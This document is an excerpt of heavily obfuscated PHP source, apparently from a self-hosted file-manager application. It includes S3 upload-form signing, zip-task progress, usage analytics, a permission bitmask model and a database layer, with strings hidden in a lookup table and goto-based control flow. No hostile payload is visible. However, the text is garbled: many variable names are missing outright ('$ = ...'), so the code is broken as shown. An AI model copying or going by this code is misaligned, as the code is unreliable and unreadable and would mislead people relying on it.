PathDriverBaseS3 { public function __construct($⁈) { parent::__construct($⁈); $this->signatureVersion($_SERVER[ʯ][240]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($, $ = 3600) { $Ӯΰ =& $_SERVER[ʯ]; $č = $Ӯΰ[222]; $ܤ = $Ӯΰ[261]; $ڧ = $Ӯΰ[72]; $Κ = gmdate($Ӯΰ[262]); $Ȗ = gmdate($Ӯΰ[263]); $х = $Ӯΰ[264]; $ש = $ . $Ӯΰ[12]; $Ӹ = $Ӯΰ[265]; $ܕ = array($this->accessKey, $Ȗ, $this->region, $ڧ, $х); $ݷ = implode($Ӯΰ[8], $ܕ); $ذ = array($Ӯΰ[266] => gmdate($Ӯΰ[267], strtotime($Ӯΰ[268])), $Ӯΰ[269] => array(array($Ӯΰ[270] => $this->bucket), array($Ӯΰ[271] => $č), array($Ӯΰ[272], $Ӯΰ[273], $Ӯΰ[12]), array($Ӯΰ[272], $Ӯΰ[274], $Ӯΰ[12]), array($Ӯΰ[272], $Ӯΰ[275], $Ӯΰ[12]), array($Ӯΰ[276] => $Ӹ), array($Ӯΰ[277] => $ݷ), array($Ӯΰ[278] => $ܤ), array($Ӯΰ[279] => $Κ), array($Ӯΰ[280] => $ש))); $ϡ = base64_encode(json_encode($ذ)); $զ = hash_hmac($Ӯΰ[281], $Ȗ, $Ӯΰ[282] . $this->secret, !0); $ = hash_hmac($Ӯΰ[281], $this->region, $զ, !0); $ = hash_hmac($Ӯΰ[281], $ڧ, $, !0); $ = hash_hmac($Ӯΰ[281], $х, $, !0); $ = hash_hmac($Ӯΰ[281], $ϡ, $); $ͪ = array($Ӯΰ[239] => $Ӯΰ[12], $Ӯΰ[283] => $Ӯΰ[12], $Ӯΰ[271] => $č, $Ӯΰ[276] => $Ӹ, $Ӯΰ[284] => $ϡ, $Ӯΰ[285] => $ݷ, $Ӯΰ[286] => $ܤ, $Ӯΰ[287] => $Κ, $Ӯΰ[288] => $ש, $Ӯΰ[289] => $, $Ӯΰ[205] => $this->getHost()); return $ͪ; } } define($_SERVER[ʯ][290], 1); define($_SERVER[ʯ][291], 2); goto eֺƌ; EΩ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $Ш =& $_SERVER[ʯ]; parent::startAfter(); Hook::bind($Ш[1823], array($this, $Ш[1818])); $݊ =& $this->task; $݊[$Ш[1820]] = $Ш[1255]; if (!$݊[$Ш[1601]]) { $݊[$Ш[1601]] = LNG($Ш[1824]); } } protected function endAfter() { $׭ =& $_SERVER[ʯ]; parent::endAfter(); Hook::unbind($׭[1823], array($this, $׭[1818])); } public function updateAfter() { $ސ =& $_SERVER[ʯ]; $Ӿ =& $this->task; if (!$Ӿ[$ސ[846]] || !$Ӿ[$ސ[823]]) { return; } if ($Ӿ[$ސ[1820]] == $ސ[1255]) { $˴ = $Ӿ[$ސ[1758]]; if ($Ӿ[$ސ[1759]] != $ސ[1255]) { $˴ = 0; } $簃 = ($Ӿ[$ސ[1762]] + $˴) / $Ӿ[$ސ[823]]; $Ӿ[$ސ[1706]] = $簃 * 0.3; } else { if ($Ӿ[$ސ[1820]] == $ސ[365]) { $簃 = $Ӿ[$ސ[1705]] / $Ӿ[$ސ[846]]; $Ӿ[$ސ[1706]] = 0.3 + $簃 * 0.5; } else { if ($Ӿ[$ސ[1820]] == $ސ[117]) { $簃 = 0; if ($Ӿ[$ސ[1757]]) { $簃 = $Ӿ[$ސ[1758]] / $Ӿ[$ސ[1757]]; } $Ӿ[$ސ[1706]] = 0.3 + 0.5 + $簃 * 0.2; } } } if ($Ӿ[$ސ[1706]] > 0) { $ = timeFloat() - $Ӿ[$ސ[1708]] - $Ӿ[$ސ[1711]]; $Ӿ[$ސ[1712]] = $ * (1 - $Ӿ[$ސ[1706]]) / $Ӿ[$ސ[1706]]; } } public function copyFileStart($Ἀ, $鈏, $ص, $þ֜, $ͫ, $즪) { $ =& $_SERVER[ʯ]; parent::copyFileStart($Ἀ, $鈏, $ص, $þ֜, $ͫ, $즪); $ =& $this->task; if ($[$[1820]] == $[365]) { $[$[1820]] = $[117]; } $this->update(); } public function copyFileEnd($, $, $ˬ, $Գ, $ݰ, $ġ) { $ö =& $_SERVER[ʯ]; $ţ =& $this->task; $ţ[$ö[1758]] = $ţ[$ö[1757]]; $ţ[$ö[1762]] += $ţ[$ö[1757]]; $ţ[$ö[1759]] = $ö[12]; $this->update(); } public function nameParse($٧) { $򿽀 =& $_SERVER[ʯ]; $ =& $this->task; if ($[$򿽀[1705]] < $[$򿽀[846]]) { $« = get_path_this($٧); if (strstr($«, $򿽀[10])) { $[$򿽀[1705]] += 1; } } if ($[$򿽀[1820]] == $򿽀[1255]) { $[$򿽀[1820]] = $򿽀[365]; } $[$򿽀[1755]] = $٧; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($) { $׀ =& $_SERVER[ʯ]; $˄ = array($׀[638] => array($׀[43] => $׀[1825], $׀[325] => array($׀[248], $׀[825], $׀[1826], $׀[1827])), $׀[1828] => array($׀[43] => $׀[1829], $׀[325] => array($׀[248], $׀[823], $׀[1830], $׀[1831], $׀[1832]))); if (!isset($˄[$])) { return !1; } $this->optionType = $˄[$][$׀[43]]; $this->field = $˄[$][$׀[325]]; return !0; } public function listData($ = false, $ = "\155\157\x64\151\146\171\124\x69\x6d\145", $ = false) { return parent::listData($, $, $); } public function trendList($ܓ) { $ =& $_SERVER[ʯ]; $Ş = $this->listData(); if ($Ş) { $˲ = end($Ş); $ۇ£ = date($[1833], strtotime($[1834])); if ($˲[$[248]] == $ۇ£) { return $Ş; } $ = strtotime($˲[$[248]]); } if (!isset($)) { $ͺ = $ܓ == $[638] ? $[575] : $[885]; $ = Model($ͺ)->min($[224]); } $ʚ = $[1835] . ucfirst($ܓ); $ = $this->dateList($); foreach ($ as $ۇ£) { $this->{$ʚ}($ۇ£); } return $this->listData(); } private function dateList($ՙ) { $൮ =& $_SERVER[ʯ]; $ = $ՙ; $Ϟ = strtotime($൮[1834]); $ڎ = array(); while ($ <= $Ϟ) { $ڎ[] = date($൮[1833], $); $ = strtotime($൮[1836], $); } return $ڎ; } public function _recordUser($ = '') { $ü =& $_SERVER[ʯ]; $ = strtotime(date($ü[1837], strtotime($))); $ = strtotime(date($ü[1838], strtotime($))); $ʣ = array($ü[224] => array($ü[1074], $)); $Ɣ = Model($ü[575])->where($ʣ)->count($ü[1704]); $ʣ[$ü[224]] = array($ü[385], array($, $)); $ = Model($ü[575])->where($ʣ)->count($ü[1704]); $ʣ[$ü[43]] = $ü[1839]; $Ӯ = Model($ü[1840])->where($ʣ)->count($ü[1841]); $ޤ = array($ü[248] => $, $ü[825] => (int) $Ɣ, $ü[1826] => (int) $, $ü[1827] => (int) $Ӯ); return $this->insert($ޤ); } public function _recordStore($ = '') { $ =& $_SERVER[ʯ]; $܋ = strtotime(date($[1838], strtotime($))); $ = array($[224] => array($[1074], $܋)); $ = Model($[520])->where($)->sum($[86]); $[$[461]] = 0; $ = Model($[885])->where($)->sum($[86]); $[$[187]] = 1; $، = Model($[885])->where($)->sum($[86]); $[$[187]] = 2; $邒 = Model($[885])->where($)->sum($[86]); $ܳ = array($[248] => $, $[823] => (int) $, $[1830] => (int) $, $[1831] => (int) $،, $[1832] => (int) $邒); return $this->insert($ܳ); } public function trend($弣, $) { $Ɋܺ =& $_SERVER[ʯ]; if (!$this->init($弣)) { return !1; } $ؕ = $this->trendList($弣); if ($ؕ && $ != $Ɋܺ[1677]) { $͎ = $ؕ[0][$Ɋܺ[248]]; $ = $this->validDate($, $͎); $ɢ = array(); $ѫ = array_to_keyvalue($ؕ, $Ɋܺ[248]); foreach ($ as $) { if (isset($ѫ[$])) { $ = $ѫ[$]; } else { $ = end($ؕ); $[$Ɋܺ[248]] = $; if ($弣 == $Ɋܺ[638]) { $[$Ɋܺ[1826]] = $[$Ɋܺ[1827]] = 0; } } $ɢ[] = $; } $ؕ = $ɢ; } $ǳ = array($Ɋܺ[638] => array($Ɋܺ[825] => LNG($Ɋܺ[1842]), $Ɋܺ[1826] => LNG($Ɋܺ[1843]), $Ɋܺ[1827] => LNG($Ɋܺ[1844])), $Ɋܺ[1828] => array($Ɋܺ[823] => LNG($Ɋܺ[1845]), $Ɋܺ[1830] => LNG($Ɋܺ[1846]), $Ɋܺ[1831] => LNG($Ɋܺ[1847]), $Ɋܺ[1832] => LNG($Ɋܺ[1848]))); $ȟ = array($Ɋܺ[638] => $Ɋܺ[1849], $Ɋܺ[1828] => $Ɋܺ[86]); if (empty($ؕ)) { $ = date($Ɋܺ[1833], strtotime($Ɋܺ[1834])); $ = array($Ɋܺ[248] => $); foreach ($ǳ[$弣] as $ߢ => $) { $[$ߢ] = 0; } $ؕ[] = $; } $ˏ = array(); foreach ($ؕ as $) { if ($弣 == $Ɋܺ[1828] && $[$Ɋܺ[1830]] > $[$Ɋܺ[823]]) { $[$Ɋܺ[1830]] = $[$Ɋܺ[823]]; } foreach ($ǳ[$弣] as $ߢ => $Ƒč) { $ = array($Ɋܺ[248] => $[$Ɋܺ[248]], $Ɋܺ[1601] => $Ƒč); $[$ȟ[$弣]] = isset($[$ߢ]) ? $[$ߢ] : 0; $ˏ[] = $; } } return $ˏ; } public function validDate($, $) { $˜ =& $_SERVER[ʯ]; $ = date($˜[1833], strtotime($˜[1834])); $֟ = array($); switch ($) { case $˜[1684]: $ = mktime(0, 0, 0, date($˜[1850]), date($˜[1420]) - date($˜[1483]) + 7 - 7, date($˜[1851])); $ӏ = 0; do { $ϝ = date($˜[1833], $ - 3600 * 24 * 7 * $ӏ); $֟[] = $ϝ; $ӏ++; } while ($ < $ϝ); break; case $˜[1682]: $ӏ = 1; do { $ԕ = date($˜[1852], strtotime("\x2d\x20{$ӏ}\x20\155\157\x6e\x74\150\x73")); $֟[] = $ԕ; $ӏ++; } while ($ < $ԕ); break; case $˜[1853]: $Պ = (int) date($˜[1851], strtotime($)); $ߵ͕ = (int) date($˜[1851]); if ($Պ >= $ߵ͕) { break; } for ($Պ; $Պ < $ߵ͕; $Պ++) { $֟[] = $Պ . $˜[1854]; } break; default: break; } if ($ > end($֟)) { array_pop($֟); } sort($֟); return $֟; } public function listTable($ҳ) { $ = ucfirst($ҳ); return Model($)->listData(); } public function option($) { $ = $_SERVER[ʯ][1855] . ucfirst($); return $this->{$}(); } private function optionUser() { $ݒ =& $_SERVER[ʯ]; $ə = Model($ݒ[575])->count($ݒ[1704]); $ = Model($ݒ[575])->where($ݒ[1856])->count($ݒ[1704]); $ψ̓ = intval($GLOBALS[$ݒ[6]][$ݒ[401]][$ݒ[1656]]) / 3600; $ = strtotime("\55{$ψ̓}\x20\150\157\x75\x72\163"); $鐩 = strtotime(date($ݒ[1837])); if ($ < $鐩) { $ = $鐩; } $ߧ = array($ݒ[1857] => array($ݒ[1075], $)); $ύ = (int) Model($ݒ[575])->where($ߧ)->count($ݒ[1704]); if (!$ύ) { $ύ = 1; } $ߧ = array($ݒ[1857] => array($ݒ[1075], $鐩)); $ݟÓ = Model($ݒ[575])->where($ߧ)->count($ݒ[1704]); return array($ݒ[818] => (int) $ə, $ݒ[1858] => (int) ($ə - $), $ݒ[1859] => (int) $, $ݒ[1860] => (int) $ݟÓ, $ݒ[1861] => $ύ); } private function optionFile() { $؅ =& $_SERVER[ʯ]; $湆 = $this->sourceSize(); $ = $湆[$؅[86]]; $ = $湆[$؅[1830]]; $ז = Model($؅[885])->where(array($؅[461] => 0))->count($؅[190]); $Δ = array($؅[461] => 0, $؅[224] => array($؅[1075], strtotime(date($؅[1837])))); $ = Model($؅[885])->where($Δ)->sum($؅[86]); $ = Model($؅[885])->where($Δ)->count($؅[190]); return array($؅[823] => $, $؅[1830] => $, $؅[1862] => $ - $, $؅[1863] => (int) $, $؅[825] => (int) $ז, $؅[1864] => (int) $); } private function optionAccess() { $ø̊ =& $_SERVER[ʯ]; return array($ø̊[818] => $this->typeLogCnt(), $ø̊[117] => $this->typeLogCnt($ø̊[117]), $ø̊[501] => $this->typeLogCnt($ø̊[501]), $ø̊[1865] => $this->typeLogCnt($ø̊[1865]), $ø̊[1866] => $this->typeLogCnt($ø̊[1866]), $ø̊[638] => $this->typeLogCnt($ø̊[12], $ø̊[1841])); } private function typeLogCnt($ = '', $֪ = "\151\x64") { $ =& $_SERVER[ʯ]; $ג = array($[117] => array($[1867], $[1868]), $[501] => array($[1869], $[1870]), $[1865] => array($[1871], $[1872], $[1873]), $[1866] => array($[1874], $[1875]), $[1876] => array($[1877], $[1878], $[1879])); $Î = strtotime(date($[1837])); $Ӆ = array($[224] => array($[1075], $Î)); if ($) { $Ӆ[$[43]] = array($[7], $ג[$]); } $׮ = Model($[1840])->where($Ӆ)->count($֪); return (int) $׮; } private function optionServer() { $ں =& $_SERVER[ʯ]; $ὓ = $this->diskDriver(); $ = KodIO::defaultDriver(); $ = array($ں[877] => $[$ں[451]]); $ = Model($ں[520])->where($)->sum($ں[86]); $ = explode($ں[63], $_SERVER[$ں[153]]); $ = $[0]; $ۏ = $GLOBALS[$ں[6]][$ں[31]]; $󎋰 = $ۏ[$ں[1037]]; if ($󎋰 == $ں[1025]) { $댶 = explode($ں[1343], $ۏ[$ں[1036]]); $󎋰 = $댶[0]; } if ($󎋰 == $ں[973] || $󎋰 == $ں[864]) { $砦 = Model()->db()->query($ں[1880]); $ = $砦[0] && isset($砦[0][$ں[1600]]) ? $砦[0][$ں[1600]] : 0; $󎋰 = $ں[1881] . ($ ? $ں[8] . $ : $ں[12]); } $ = $GLOBALS[$ں[6]][$ں[401]][$ں[887]]; return array($ں[1882] => $ὓ ? $ὓ[$ں[1883]] : 0, $ں[1884] => $ὓ ? $ὓ[$ں[1885]] : 0, $ں[1886] => (int) $[$ں[1883]] * 1024 * 1024 * 1024, $ں[1887] => (int) $, $ں[1888] => ucfirst($), $ں[1889] => $ں[1890] . PHP_VERSION, $ں[1891] => phpBuild64() ? 64 : 32, $ں[817] => str_replace($ں[1191], $ں[1053], $󎋰), $ں[401] => ucfirst($), $ں[42] => $_SERVER[$ں[1892]]); } private function diskDriver() { $۸ =& $_SERVER[ʯ]; $ό = $۸[8]; $Ց = $GLOBALS[$۸[6]][$۸[1360]] == $۸[1361]; if ($Ց) { $ό = $۸[1893]; if (function_exists($۸[1894])) { exec($۸[1895], $); $ό = $[1] . $۸[8]; } } if (!file_exists($ό)) { return; } $Ŋ = @disk_total_space($ό); $ = $Ŋ - @disk_free_space($ό); return array($۸[1883] => $Ŋ, $۸[1885] => $); } public function fileChart($) { $阜 =& $_SERVER[ʯ]; if (isset($[$阜[1704]])) { return Model($阜[885])->userFileTypeProfile($[$阜[1704]]); } if (isset($[$阜[1896]])) { return Model($阜[885])->groupFileTypeProfile($[$阜[1896]]); } $ = $this->sourceSize(); $Ӥ = array($阜[189] => 0, $阜[187] => 1); $Ԁ = Model($阜[885])->where($Ӥ)->sum($阜[86]); $Ӥ[$阜[187]] = 2; $ = Model($阜[885])->where($Ӥ)->sum($阜[86]); return array($阜[823] => $[$阜[86]], $阜[1830] => $[$阜[1830]], $阜[1831] => (int) $Ԁ, $阜[1832] => (int) $); } private function sourceSize() { $ =& $_SERVER[ʯ]; $ = Model($[885])->where(array($[461] => 0))->sum($[86]); $ɖ֓ = Model($[520])->sum($[86]); if ($ɖ֓ > $) { $ɖ֓ = $; } return array($[86] => (int) $, $[1830] => (int) $ɖ֓); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ =& $_SERVER[ʯ]; $ъ = array(array($[470] => LNG($[1897]), $[1898] => $[1899], $[1900] => 1, $[1901] => 1, $[1902] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($[470] => LNG($[1903]), $[1898] => $[1904], $[1900] => 2, $[1901] => 1, $[1902] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($[470] => LNG($[1905]), $[1898] => $[1906], $[1900] => 3, $[1901] => 1, $[1902] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($[470] => LNG($[1907]), $[1898] => $[1908], $[1900] => 4, $[1901] => 1, $[1902] => self::AUTH_SHOW | self::AUTH_VIEW), array($[470] => LNG($[1909]), $[1898] => $[1910], $[1900] => 5, $[1901] => 1, $[1902] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($[470] => LNG($[1911]), $[1898] => $[1912], $[1900] => 6, $[1901] => 1, $[1902] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($[470] => LNG($[1913]), $[1898] => $[1914], $[1900] => 7, $[1901] => 1, $[1902] => 0)); return $ъ; } public static function authCheck($ڝݳ, $界ɹ) { $¯ =& $_SERVER[ʯ]; $ڝݳ = intval($ڝݳ); if ($GLOBALS[$¯[544]] && $GLOBALS[$¯[6]][$¯[1915]]) { return !0; } if ($ڝݳ <= 0) { return !1; } if (($ڝݳ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ڝݳ & $界ɹ); } public static function authCheckShow($倀) { return self::authCheck($倀, self::AUTH_SHOW); } public static function authCheckView($×) { return self::authCheck($×, self::AUTH_VIEW); } public static function authCheckDownload($ج) { return self::authCheck($ج, self::AUTH_DOWNLOAD); } public static function authCheckUpload($騝ų) { return self::authCheck($騝ų, self::AUTH_UPLOAD); } public static function authCheckEdit($׈) { return self::authCheck($׈, self::AUTH_EDIT); } public static function authCheckRemove($Џ) { return self::authCheck($Џ, self::AUTH_REMOVE); } public static function authCheckShare($𞪌) { return self::authCheck($𞪌, self::AUTH_SHARE); } public static function authCheckComment($) { return self::authCheck($, self::AUTH_COMMENT); } public static function authCheckEvent($Ƹ) { return self::authCheck($Ƹ, self::AUTH_EVENT); } public static function authCheckRoot($җɒ) { return self::authCheck($җɒ, self::AUTH_ROOT); } public static function authCheckAction($ޠ, $) { $ =& $_SERVER[ʯ]; $ = array($[1916] => self::AUTH_VIEW, $[1255] => self::AUTH_DOWNLOAD, $[117] => self::AUTH_UPLOAD, $[1866] => self::AUTH_EDIT, $[1865] => self::AUTH_REMOVE, $[1876] => self::AUTH_SHARE, $[406] => self::AUTH_COMMENT, $[1692] => self::AUTH_EVENT, $[1917] => self::AUTH_ROOT); if (!isset($[$])) { return; } $Ә = $[$]; $ޠ = intval($ޠ); if ($ޠ <= 0) { return !1; } if (($ޠ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ޠ & $Ә); } public static function authDisable($Ӌ, $) { if (intval($Ӌ) <= 0) { return 0; } return intval($Ӌ) & ~$; } public $optionType = "\123\171\x73\x74\x65\x6d\56\x73\157\x75\x72\x63\x65\101\165\164\x68\x4c\x69\163\164"; public $field = array("\x6e\x61\155\145", "\x61\x75\164\150", "\x6c\x61\142\145\154", "\x64\151\163\160\154\141\171", "\x73\x79\x73\164\x65\155", "\x73\157\x72\164"); public function initData() { $ߥ = $this->authDefault(); foreach ($ߥ as $Ρ) { $this->add($Ρ); } } public function findAuth($, $ڝ) { $ޖ =& $_SERVER[ʯ]; $ = parent::listData(); foreach ($ as $۷) { $ˎǡ = intval($۷[$ޖ[463]]); if ($ˎǡ <= 0 || $۷[$ޖ[1918]] == 0) { continue; } if (($ˎǡ & $) != $) { continue; } if (($ˎǡ & $ڝ) != 0) { continue; } return $۷[$ޖ[451]]; } return !1; } public function findAuthReadOnly() { $֑ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ޘ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($֑, $ޘ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $֣ =& $_SERVER[ʯ]; $ = parent::listData(); $􋃑 = !1; foreach ($ as $) { if ($[$֣[463]] <= 0 || $[$֣[1918]] == $֣[221]) { continue; } if (!$􋃑) { $􋃑 = $; continue; } if ($􋃑[$֣[463]] > $[$֣[463]]) { $􋃑 = $; } } return $􋃑 ? $􋃑[$֣[451]] : $֣[12]; } public function listData($ = false, $ŀ = "\163\157\x72\x74", $߻ = false) { return parent::listData($, $ŀ, $߻); } public function update($, $) { $ =& $_SERVER[ʯ]; $Ֆ = parent::listData($); $ = $this->findByName($[$[42]]); if (!$Ֆ || $ && $[$[451]] != $Ֆ[$[451]]) { return !1; } $this->filterAuth($[$[463]]); return parent::update($, $); } public function remove($) { $ف = parent::listData($); if (!$ف || $ف[$_SERVER[ʯ][188]]) { return !1; } return parent::remove($); } public function add($ = array()) { $ =& $_SERVER[ʯ]; if ($this->findByName($[$[42]])) { return !1; } $ = array($[42] => $[12], $[463] => 1, $[1919] => $[1906], $[1918] => 1, $[188] => 0, $[1920] => 0); $ = array_merge($, $); $[$[1920]] = $this->getSort(); $this->filterAuth($[$[463]]); return parent::insert($); } private function getSort() { $֧ =& $_SERVER[ʯ]; $ = parent::listData(); $ͧ = array_to_keyvalue($, $֧[12], $֧[1920]); return empty($ͧ) ? 0 : max($ͧ) + 1; } private function filterAuth(&$ݾ) { if (!$ݾ) { return; } $ԙ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $۫ = array(); foreach ($ԙ as $) { if ($ݾ & $) { $۫[] = $; } } if (in_array(self::AUTH_ROOT, $۫)) { $ݾ = array_sum($ԙ); return; } $ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($۫ as $) { if (isset($[$])) { $۫ = array_merge($۫, $[$]); } } $۫[] = self::AUTH_SHOW; $ݾ = array_sum(array_unique($۫)); } public function sort($Ӫ, $̕ø) { return parent::update($Ӫ, $̕ø); } } goto fڈ; cÏ: class DbSqlite3 extends DbSqlite3Base { public function query($) { $ֹ =& $_SERVER[ʯ]; if (!CacheLock::fileLock($ֹ[23])) { return !1; } $ = parent::query($); CacheLock::fileUnLock($ֹ[23]); return $; } public function execute($ٸ) { $県 =& $_SERVER[ʯ]; if (!CacheLock::fileLock($県[23])) { return !1; } $ = parent::execute($ٸ); CacheLock::fileUnLock($県[23]); return $; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\145\161" => "\74\76", "\x67\x74" => "\x3e", "\145\x67\x74" => "\76\75", "\x6c\x74" => "\74", "\145\154\164" => "\74\75", "\156\x6f\x74\154\x69\x6b\145" => "\116\x4f\124\40\114\x49\113\x45", "\154\x69\x6b\x65" => "\114\111\113\x45", "\x69\156" => "\x49\x4e", "\156\157\164\x69\156" => "\x4e\x4f\x54\x20\x49\x4e", "\156\157\x74\40\151\x6e" => "\x4e\x4f\x54\x20\111\116", "\142\x65\x74\x77\145\x65\x6e" => "\102\x45\124\x57\105\x45\x4e", "\x6e\x6f\x74\x62\x65\x74\167\145\145\x6e" => "\116\117\x54\40\x42\105\124\127\105\105\116", "\x6e\x6f\x74\40\142\x65\164\x77\x65\x65\x6e" => "\x4e\x4f\x54\40\102\x45\124\127\105\x45\x4e"); protected $selectSql = "\123\105\114\x45\x43\124\45\104\x49\123\124\x49\116\103\124\x25\40\45\106\111\x45\x4c\x44\45\x20\x46\122\x4f\115\x20\45\x54\101\x42\x4c\105\45\x25\x4a\117\111\x4e\x25\x25\x57\110\x45\122\x45\45\45\x47\122\x4f\125\x50\x25\45\x48\101\126\111\116\x47\x25\45\117\x52\104\105\122\x25\45\114\111\x4d\111\x54\x25\x20\x25\x55\116\111\x4f\x4e\x25\45\x43\x4f\115\x4d\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ʯ][1021], $); } public function factory($ꇑ = '') { $ =& $_SERVER[ʯ]; $ꇑ = $this->parseConfig($ꇑ); if (empty($ꇑ[$[1022]])) { think_exception(think_lang($[1023])); } $this->dbType = ucwords(strtolower($ꇑ[$[1022]])); $궑 = $[1024] . $this->dbType; if (class_exists($궑)) { $ = new $궑($ꇑ); if ($[1025] != strtolower($ꇑ[$[1022]])) { $->dbType = strtoupper($this->dbType); } else { $->dbType = $this->_getDsnType($ꇑ[$[977]]); } } else { think_exception(think_lang($[1026]) . $[1027] . $궑); } return $; } public function __call($ߥ, $) { if (method_exists($this, $ߥ)) { return call_user_func_array(array($this, $ߥ), $); } } protected function _getDsnType($) { $ҡ = explode($_SERVER[ʯ][4], $); $ = strtoupper(trim($ҡ[0])); return $; } private function parseConfig($ٳ = '') { $ =& $_SERVER[ʯ]; if (!empty($ٳ) && is_string($ٳ)) { $ٳ = $this->parseDSN($ٳ); } elseif (is_array($ٳ)) { $ٳ = array_change_key_case($ٳ); $ٳ = array($[1022] => $ٳ[$[1028]], $[949] => $ٳ[$[1029]], $[950] => $ٳ[$[1030]], $[947] => $ٳ[$[1031]], $[948] => $ٳ[$[1032]], $[31] => $ٳ[$[1033]], $[977] => $ٳ[$[1034]], $[27] => isset($ٳ[$[1035]]) ? $ٳ[$[1035]] : array()); } elseif (empty($ٳ)) { if (think_config($[1036]) && $[1025] != strtolower(think_config($[1037]))) { $ٳ = $this->parseDSN(think_config($[1036])); } else { $ٳ = array($[1022] => think_config($[1037]), $[949] => think_config($[1038]), $[950] => think_config($[1039]), $[947] => think_config($[1040]), $[948] => think_config($[1041]), $[31] => think_config($[298]), $[977] => think_config($[1036]), $[27] => think_config($[1042])); } } return $ٳ; } protected function initConnect($Ί = true) { if (1 == think_config($_SERVER[ʯ][32])) { $this->_linkID = $this->multiConnect($Ί); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ => $菱) { $this->_linkID = $菱; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ꄵ = false) { $钿 =& $_SERVER[ʯ]; static $ˣ = array(); static $ = -1; if (empty($ˣ)) { foreach ($this->config as $ => $) { $ˣ[$] = explode($钿[60], $); } } if (think_config($钿[1043])) { if ($ꄵ || think_config($钿[447]) === !0) { $ߚ = floor(mt_rand(0, think_config($钿[1044]) - 1)); $ = $ߚ; } else { if (is_numeric(think_config($钿[1045]))) { $ߚ = think_config($钿[1045]); } else { $ߚ = floor(mt_rand(think_config($钿[1044]), count($ˣ[$钿[947]]) - 1)); } } } else { $ߚ = floor(mt_rand(0, count($ˣ[$钿[947]]) - 1)); $ = $ߚ; } $ߚ = $ !== -1 ? $ : $ߚ; $ϝ = array($钿[949] => isset($ˣ[$钿[949]][$ߚ]) ? $ˣ[$钿[949]][$ߚ] : $ˣ[$钿[949]][0], $钿[950] => isset($ˣ[$钿[950]][$ߚ]) ? $ˣ[$钿[950]][$ߚ] : $ˣ[$钿[950]][0], $钿[947] => isset($ˣ[$钿[947]][$ߚ]) ? $ˣ[$钿[947]][$ߚ] : $ˣ[$钿[947]][0], $钿[948] => isset($ˣ[$钿[948]][$ߚ]) ? $ˣ[$钿[948]][$ߚ] : $ˣ[$钿[948]][0], $钿[31] => isset($ˣ[$钿[31]][$ߚ]) ? $ˣ[$钿[31]][$ߚ] : $ˣ[$钿[31]][0], $钿[977] => isset($ˣ[$钿[977]][$ߚ]) ? $ˣ[$钿[977]][$ߚ] : $ˣ[$钿[977]][0], $钿[27] => isset($ˣ[$钿[27]][$ߚ]) ? $ˣ[$钿[27]][$ߚ] : $ˣ[$钿[27]][0]); return $this->connect($ϝ, $ߚ); } public function parseDSN($Ҳ) { $罚 =& $_SERVER[ʯ]; if (empty($Ҳ)) { return !1; } $ = parse_url($Ҳ); if ($[$罚[204]]) { $ӑ = array($罚[1022] => $[$罚[204]], $罚[949] => isset($[$罚[638]]) ? $[$罚[638]] : $罚[12], $罚[950] => isset($[$罚[1046]]) ? $[$罚[1046]] : $罚[12], $罚[947] => isset($[$罚[205]]) ? $[$罚[205]] : $罚[12], $罚[948] => isset($[$罚[206]]) ? $[$罚[206]] : 